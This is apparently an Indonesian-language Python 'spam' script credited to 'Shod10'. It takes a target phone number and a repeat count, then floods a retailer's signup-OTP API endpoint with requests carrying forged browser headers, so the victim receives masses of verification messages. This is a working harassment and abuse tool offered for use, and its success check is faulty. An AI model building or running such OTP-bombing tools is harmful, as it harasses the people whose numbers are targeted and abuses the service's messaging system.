blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'

import json
import requests
import sys
import os

def main():
	os.system('clear')
	os.system('figlet Shod10')
	banner = '''

	[>]AUTHOR  :  Shod10
	'''
	print(banner)
	no = input('target : ')
	jum = input('jumlah spam : ')

	head = {
	"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
	"Referer": "https://www.mapclub.com/en/user/signup",
	"Host": "cmsapi.mapclub.com",
	}


	dat = {
	'phone' : no
	}


	for x in range(int(jum)):
		leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp",headers=head, json=dat)
	if 'eror' in leosureo:
		print('gagal mengirim'  + no)
	else:
		print('sukses mengirim'  + no)

main()
